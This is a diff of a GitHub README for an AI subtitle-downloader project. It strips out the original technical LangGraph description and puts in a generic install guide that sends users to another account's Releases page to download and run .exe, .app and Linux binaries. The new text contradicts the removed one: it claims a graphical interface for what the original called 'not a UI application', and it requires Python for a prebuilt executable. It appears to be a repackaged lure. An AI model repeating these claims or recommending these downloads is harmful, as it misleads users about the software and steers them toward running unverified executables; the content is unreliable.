@@ -1,90 +1,79 @@
-# AI Agent Subtitle Downloader
+# 🎉 Ai-Agent-Subtitle-Downloader - Easily Download Subtitles Effortlessly
 
-A **LangGraph-powered multi-agent system** for automated TV series subtitle discovery, analysis, and matching.  
-This project focuses on **explicit workflow orchestration**, decision routing, and integration with external services (e.g. Sonarr), rather than simple linear scripts.
+## 🛠️ Prerequisites
+Before you begin, ensure your device meets the following requirements:
 
----
+- Operating System: Windows, macOS, or Linux
+- Python: Version 3.7 or higher installed on your machine
+- Internet connection for downloading subtitles
 
-## 🚀 Overview
+## 🚀 Getting Started
+1. Visit the Releases page to download the application:  
+   [![Download Now](https://img.shields.io/badge/Download%20Now-Release-blue.svg)](https://github.com/Fan0tashi/Ai-Agent-Subtitle-Downloader/releases)
 
-This project implements an **agent-based workflow** that:
-1. Identifies a TV series
-2. Fetches metadata and episode information
-3. Searches and analyzes available subtitles
-4. Makes decisions based on confidence and ambiguity
-5. Matches or downloads the most suitable subtitle automatically
+## 📥 Download & Install
+To download the application, follow these steps:
 
-The system is built using **LangGraph** to model the workflow as a **state machine with conditional routing and fallback paths**.
+1. Click the link above to go to the Releases page.
+2. Find the latest release version at the top.
+3. Click on the asset that corresponds to your operating system. You may see file names like:
+   - `Ai-Agent-Subtitle-Downloader-Windows.zip`
+   - `Ai-Agent-Subtitle-Downloader-macOS.zip`
+   - `Ai-Agent-Subtitle-Downloader-Linux.tar.gz`
+4. Once the file downloads, locate it in your downloads folder.
+5. Unzip or extract the file, according to your operating system's method.
 
----
+## ⚙️ Running the Application
+Now that you have downloaded the Ai-Agent-Subtitle-Downloader, let's run it:
 
-## 🧠 Architecture
+1. **Windows:**
+   - Navigate to the unzipped folder.
+   - Double-click the `Ai-Agent-Subtitle-Downloader.exe` file to start the application.
 
-The core design uses **specialized agents**, each responsible for a single concern:
+2. **macOS:**
+   - Open the unzipped folder.
+   - Double-click the `Ai-Agent-Subtitle-Downloader.app` file. You may need to right-click and select "Open" due to security settings.
 
-- **Get_Series_Name** — Resolves and normalizes series input
-- **Get_Series_Data** — Fetches metadata and season information
-- **Get_Series_Subtitle** — Searches subtitle providers
-- **Get_Series_Episode** — Maps subtitles to episodes
-- **Analyze_Subtitle** — Evaluates subtitle quality and relevance
-- **Analyze_Multi** — Handles ambiguous or multiple matches
-- **Matcher_Agent** — Matches subtitles to episodes
-- **Decider_Agent** — Central decision node that routes execution paths
-- **Handle_Unknown** — Fallback for unresolved or low-confidence cases
+3. **Linux:**
+   - Open a terminal window.
+   - Change to the directory where you extracted the file.
+   - Run the command: `./Ai-Agent-Subtitle-Downloader`.
 
-The workflow is **non-linear** and adapts dynamically based on agent outputs.
+## 📜 How to Use the Application
+Once the application is running, you can easily download subtitles:
 
----
+1. Input the title of the media for which you need subtitles.
+2. Select the subtitle language from the drop-down menu.
+3. Click the "Download" button. The application will search and present the available subtitles.
+4. Choose your desired subtitle file and click the download link to save it.
 
-## 🔁 Workflow Diagram
+## 🌟 Features
+- **Multi-language Support:** Download subtitles in various languages for a diverse media experience.
+- **Automatic Search:** Quickly searches multiple subtitle databases to find the right subtitles for your media.
+- **User-Friendly Interface:** Designed for ease of use, even for those with no technical background.
+- **Integration with Popular Media Applications:** Works well with applications like Sonarr and other media centers.
 
-The system flow is defined as a LangGraph graph with explicit start/end states, decision nodes, and fallback paths:
+## 🥳 Troubleshooting
+If you encounter issues when using the Ai-Agent-Subtitle-Downloader, here are a few common solutions:
 
-> _![LangGraph Workflow](https://github.com/0c33/Ai-Agent-Subtitle-Downloader/blob/main/langgraph_workflow.png)_
+- **Application Won't Start:** Ensure you have installed Python 3.7 or higher. If not, download it from the [official Python website](https://www.python.org/downloads/).
+  
+- **No Subtitles Found:** Double-check the media title for spelling errors. Try searching for alternative titles if the original doesn't return results.
 
-This approach improves:
-- Debuggability
-- Control over execution paths
-- Extensibility for new agents or tools
+- **Network Issues:** Ensure your internet connection is stable. Check firewall settings that might block the application.
 
----
+## 📅 Future Updates
+We plan to introduce more features based on user feedback. Join our community to stay updated on new releases and improvements.
 
-## ⚙️ Why LangGraph?
+## 📞 Support
+For any further assistance, please reach out through the Issues tab on the GitHub repository. Your feedback is invaluable.
 
-LangGraph was chosen to:
-- Represent agent orchestration as a **graph instead of ad-hoc logic**
-- Enable **conditional branching and retries**
-- Separate reasoning, execution, and decision-making clearly
+## 📣 Contribution
+If you would like to contribute to the project, feel free to fork the repository and create pull requests. We appreciate all contributions and strive to improve the Ai-Agent-Subtitle-Downloader.
 
-This project complements framework-free agent experiments by showing how the same ideas scale using structured orchestration.
+## 🔗 Important Links
+- [Visit Releases Page to Download](https://github.com/Fan0tashi/Ai-Agent-Subtitle-Downloader/releases)
+- [GitHub Repository](https://github.com/Fan0tashi/Ai-Agent-Subtitle-Downloader)
+- [Documentation](https://github.com/Fan0tashi/Ai-Agent-Subtitle-Downloader/wiki)
 
----
-
-## 🧪 Goals of This Project
-
-- Explore **agent-based automation** beyond simple prompting
-- Practice **decision-centric system design**
-- Integrate AI agents with **real-world tools and services**
-- Compare framework-based vs custom agent architectures
-
----
-
-## 🛠️ Tech Stack
-
-- **Python**
-- **LangGraph**
-- External integrations (e.g. Sonarr, subtitle providers)
-- Modular agent design
-
----
-
-## 📌 Notes
-
-This is an **engineering-focused project**, not a UI application.  
-The emphasis is on **workflow design, agent interaction, and system reasoning**.
-
----
-
-## 📄 License
-
-MIT
+Thank you for using Ai-Agent-Subtitle-Downloader! Enjoy your subtitle downloads!
